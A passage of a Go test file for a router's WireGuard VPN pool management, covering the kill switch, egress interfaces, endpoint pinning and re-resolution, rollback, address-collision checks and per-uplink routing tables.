	if len(k.ProbeIPs) != 2 || k.ProbeIPs[0] != "1.1.1.1" || k.ProbeIPs[1] != "8.8.8.8" {
		t.Errorf("probe set = %v, want the default foreign targets", k.ProbeIPs)
	}
}

// It is not a VPN setting: it exists because the uplink does.
func TestApplyKillSwitchState_ArmedWithNoTunnelConfigured(t *testing.T) {
	ctx := context.Background()
	m := nft.NewManager(&nft.FakeApplier{})
	if err := ApplyKillSwitchState(ctx, m, twoUplinks(), nil, nil); err != nil {
		t.Fatal(err)
	}
	if m.Snapshot().KillSwitch == nil {
		t.Fatal("no kill switch with no VPN configured; the uplink would carry traffic in the clear")
	}

	// With no secondary uplink there is nothing to guard.
	if err := ApplyKillSwitchState(ctx, m, twoUplinks()[:1], nil, nil); err != nil {
		t.Fatal(err)
	}
	if m.Snapshot().KillSwitch != nil {
		t.Error("a kill switch on a box with no secondary uplink")
	}
}

func TestLANEgressNames_NeverIncludesTheSecondaryUplink(t *testing.T) {
	for _, vpn := range []VPNRouteState{{}, {IfNames: []string{"nasnet-wg0", "nasnet-wg1"}}} {
		names := lanEgressNames(twoUplinks(), vpn)
		for _, n := range names {
			if n == "enp2s0" {
				t.Errorf("vpn active=%v: the LAN can still leave by the raw uplink: %v",
					vpn.Active(), names)
			}
		}
		if vpn.Active() && (len(names) != 3 || names[1] != "nasnet-wg0" || names[2] != "nasnet-wg1") {
			t.Errorf("names = %v, want the domestic uplink and both tunnels", names)
		}
	}
}

func TestWGApplyConfig_UsesThePinnedEndpointAndItsOwnPort(t *testing.T) {
	cfg := &domain.WireGuardConfig{
		PrivateKey: tPriv, Address: "10.66.0.2/32",
		MTU: 1380,
		Peer: domain.WGPeerConfig{
			PublicKey: tPub, AllowedIPs: []string{"0.0.0.0/0"},
			Endpoint: "vpn.example.com:51820", PersistentKeepalive: 15,
		},
		PinnedEndpointIP: "185.65.135.1",
		DNS:              "10.64.0.1",
	}
	got, err := wgApplyConfig(cfg, netmark.PinMark(2))
	if err != nil {
		t.Fatal(err)
	}
	if got.Endpoint.String() != "185.65.135.1:51820" {
		t.Errorf("endpoint = %v", got.Endpoint)
	}
	if got.MTU != 1380 || got.Keepalive != 15*time.Second {
		t.Errorf("mtu = %d keepalive = %v; explicit values must not be overwritten", got.MTU, got.Keepalive)
	}
	if got.DNS.String() != "10.64.0.1" {
		t.Errorf("dns = %v", got.DNS)
	}
	if len(got.AllowedIPs) != 1 || got.AllowedIPs[0].String() != "0.0.0.0/0" {
		t.Errorf("allowed ips = %v", got.AllowedIPs)
	}
}

// A rollback that cannot take the tunnels down leaves routes pointing into them.
func TestRestorePool_TearsDownWhenNothingWasEnabled(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Enabled: true, WGSlot: slotOf(0), Config: wgConfigJSON(t, nil)}}
	if err := f.uc.applyVPNDevices(ctx); err == nil {
		// No pinned address, so this resolves; that is fine for the fixture.
		_ = err
	}
	_ = f.wg.Ensure(ctx, system.WGLinkName, system.WGApplyConfig{})

	if err := f.uc.restorePool(ctx, nil); err != nil {
		t.Fatal(err)
	}
	if f.repo.rows[0].Enabled {
		t.Error("the profile is still enabled after a revert")
	}
	if f.wg.Deleted[system.WGLinkName] == 0 {
		t.Error("the tunnel interface survived the revert")
	}
}

func TestRestorePool_PutsThePreviousSetBack(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	// A profile that was ever enabled carries its pinned address, which is what
	// makes the revert independent of any resolver.
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin",
		Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) { c.PinnedEndpointIP = "185.65.135.1" })}}

	want := f.repo.rows[0]
	want.Enabled, want.WGSlot, want.Priority, want.Weight = true, slotOf(0), 0, 1
	if err := f.uc.restorePool(ctx, []domain.VPNProfile{want}); err != nil {
		t.Fatal(err)
	}
	if !f.repo.rows[0].Enabled {
		t.Error("the previous member was not re-enabled")
	}
	if f.wg.State(system.WGLinkName) == nil {
		t.Error("the tunnel was not brought back up")
	}
	// The dead-man runs out of process while the network is broken; a revert
	// that needed DNS would be a revert that could not run.
	if f.doh.calls != 0 {
		t.Errorf("the revert made %d DNS lookups", f.doh.calls)
	}
}

// Providers move endpoints. A tunnel that has gone quiet looks the same either
// way, so the only way to tell is to ask again.
func TestCheckVPNHealth_ReresolvesASilentTunnel(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Enabled: true, Weight: 1, WGSlot: slotOf(0),
		Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) { c.PinnedEndpointIP = "1.2.3.4" })}}
	if err := f.uc.applyVPNDevices(ctx); err != nil {
		t.Fatal(err)
	}
	f.wg.State(system.WGLinkName).Stat = &system.WGStatus{} // never handshook

	f.uc.checkVPNHealth(ctx)
	if f.wg.State(system.WGLinkName).Endpoint.Addr().String() != "185.65.135.1" {
		t.Errorf("endpoint = %v, want the freshly resolved address", f.wg.State(system.WGLinkName).Endpoint)
	}
	stored, _ := f.repo.Get(ctx, 1)
	if !strings.Contains(stored.Config, "185.65.135.1") {
		t.Error("the new address was not persisted, so a reboot would use the stale one")
	}

	// And it must not do that on every tick: each one is a request out the raw
	// uplink.
	before := f.doh.calls
	f.uc.checkVPNHealth(ctx)
	if f.doh.calls != before {
		t.Errorf("re-resolved again immediately: %d calls", f.doh.calls)
	}
}

// An address endpoint cannot have moved, so asking is pure noise.
func TestCheckVPNHealth_NeverReresolvesAnAddressEndpoint(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{{ID: 1, Name: "berlin", Enabled: true, Weight: 1, WGSlot: slotOf(0),
		Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) {
			c.Peer.Endpoint = "185.65.135.1:51820"
		})}}
	if err := f.uc.applyVPNDevices(ctx); err != nil {
		t.Fatal(err)
	}
	f.wg.State(system.WGLinkName).Stat = &system.WGStatus{}

	f.uc.checkVPNHealth(ctx)
	if f.doh.calls != 0 {
		t.Errorf("looked up an address %d times", f.doh.calls)
	}
}

func hasVerdict(vs []domain.Verdict, rule string) bool {
	for _, v := range vs {
		if v.Rule == rule {
			return true
		}
	}
	return false
}

// Same inner IP is a collision whatever the mask says; comparing the raw CIDR
// strings let /24 slip past the /32 already in the pool.
func TestEnableVPNProfile_RejectsTheSameAddressUnderADifferentMask(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{
		{ID: 1, Name: "a", Enabled: true, Weight: 1, WGSlot: slotOf(0),
			Config: wgConfigJSON(t, nil)},
		{ID: 2, Name: "wider", Weight: 1, Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) {
			c.Address = "10.66.0.2/24"
		})},
	}
	verdicts, view, err := f.uc.EnableVPNProfile(ctx, 2)
	if err != nil {
		t.Fatal(err)
	}
	if !domain.Rejected(verdicts) || !hasVerdict(verdicts, "V36") {
		t.Fatalf("verdicts = %+v, want a V36 reject", verdicts)
	}
	if view != nil {
		t.Error("applied despite the reject")
	}
}

// Nothing reinstalls the oif rules on a tier edit, so the pool's order — which
// decides their prefs — must not depend on the tier.
func TestPoolOrderFollowsTheSlotNotTheTier(t *testing.T) {
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{
		{ID: 1, Name: "frankfurt", Enabled: true, Weight: 1, Priority: 3, WGSlot: slotOf(0),
			Config: wgConfigJSON(t, nil)},
		{ID: 2, Name: "vienna", Enabled: true, Weight: 1, Priority: 0, WGSlot: slotOf(1),
			Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) { c.Address = "10.66.1.2/32" })},
	}
	got := f.uc.vpnPoolNow(context.Background()).IfNames()
	want := []string{"nasnet-wg0", "nasnet-wg1"}
	if len(got) != len(want) || got[0] != want[0] || got[1] != want[1] {
		t.Fatalf("IfNames = %v, want %v — slot order, whatever the tiers say", got, want)
	}
}

// Each via table holds exactly the tunnels dealt onto its WAN.
func TestApplyViaRoutes_SplitsThePoolByTransport(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{
		{ID: 1, Name: "a", Enabled: true, Weight: 1, WGSlot: slotOf(0),
			Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) { c.PinnedEndpointIP = "185.65.135.1" })},
		{ID: 2, Name: "b", Enabled: true, Weight: 1, WGSlot: slotOf(1),
			Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) { c.PinnedEndpointIP = "185.65.135.2" })},
	}
	uplinks := viaTestUplinks()
	pool := f.uc.vpnPoolNow(ctx)
	if len(pool.Tunnels) != 2 {
		t.Fatalf("fixture pool = %+v", pool.Tunnels)
	}
	f.uc.rememberTransport(map[string]Uplink{
		pool.Tunnels[0].IfName: uplinks[1],
		pool.Tunnels[1].IfName: uplinks[2],
	})

	if err := f.uc.applyViaRoutes(ctx, pool, uplinks); err != nil {
		t.Fatal(err)
	}

	oneDefaultVia := func(table int, wantOif string) {
		t.Helper()
		routes, _ := f.be.RouteList(ctx, table)
		var defaults int
		for _, r := range routes {
			if r.Dest != "default" {
				continue
			}
			defaults++
			if len(r.Nexthops) != 1 || r.Nexthops[0].OifName != wantOif {
				t.Errorf("table %d default = %+v, want via %s", table, r, wantOif)
			}
		}
		if defaults != 1 {
			t.Errorf("table %d has %d defaults, want 1", table, defaults)
		}
	}
	oneDefaultVia(207, pool.Tunnels[0].IfName)
	oneDefaultVia(209, pool.Tunnels[1].IfName)

	// Unassigned slots hold nothing; their blackhole rule does the talking.
	for _, table := range []int{208, 210} {
		if routes, _ := f.be.RouteList(ctx, table); len(routes) != 0 {
			t.Errorf("table %d = %+v, want empty", table, routes)
		}
	}
}

// A rehomed tunnel must leave its old slice, or "via secondary" silently means
// a different WAN.
func TestApplyViaRoutes_RehomeMovesTheSlice(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.repo.rows = []domain.VPNProfile{
		{ID: 1, Name: "a", Enabled: true, Weight: 1, WGSlot: slotOf(0),
			Config: wgConfigJSON(t, func(c *domain.WireGuardConfig) { c.PinnedEndpointIP = "185.65.135.1" })},
	}
	uplinks := viaTestUplinks()
	pool := f.uc.vpnPoolNow(ctx)

	f.uc.rememberTransport(map[string]Uplink{pool.Tunnels[0].IfName: uplinks[1]})
	if err := f.uc.applyViaRoutes(ctx, pool, uplinks); err != nil {
		t.Fatal(err)
	}
	f.uc.rememberTransport(map[string]Uplink{pool.Tunnels[0].IfName: uplinks[2]})
	if err := f.uc.applyViaRoutes(ctx, pool, uplinks); err != nil {
		t.Fatal(err)
	}

	if routes, _ := f.be.RouteList(ctx, 207); len(routes) != 0 {
		t.Errorf("old slice still routed: %+v", routes)
	}
	routes, _ := f.be.RouteList(ctx, 209)
	if len(routes) != 1 || routes[0].Dest != "default" {
		t.Errorf("new slice = %+v, want one default", routes)
	}
}

// No pool means no slices anywhere, same as table 203.
func TestApplyViaRoutes_EmptyPoolClearsEverySlice(t *testing.T) {
	ctx := context.Background()
	f := newVPNFixture(t)
	f.uc.rememberTransport(map[string]Uplink{})
	_ = f.be.RouteReplace(ctx, system.Route{Table: 207, Dest: "default",
		Nexthops: []system.Nexthop{{OifName: "nasnet-wg0", Weight: 1}}})

	if err := f.uc.applyViaRoutes(ctx, vpnPool{}, viaTestUplinks()); err != nil {
		t.Fatal(err)
	}
	if routes, _ := f.be.RouteList(ctx, 207); len(routes) != 0 {
		t.Errorf("stale slice survived: %+v", routes)
	}
}
